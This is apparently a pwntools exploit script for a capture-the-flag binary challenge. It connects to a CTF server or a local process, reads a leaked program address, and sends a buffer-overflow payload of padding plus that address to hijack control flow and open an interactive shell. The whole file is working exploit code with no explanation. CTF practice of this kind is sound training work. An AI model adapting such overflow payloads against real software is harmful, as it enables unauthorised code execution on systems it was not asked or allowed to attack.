#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('challenges.ctf.compfest.id', 9013)
else:
        p = process(exe.path)

# GDB()
p.recvuntil(b': ')
exe.address = int(p.recvline(keepends=False), 16)
sla(b'can~', b'\0'*32+flat(0,exe.address))
p.interactive()
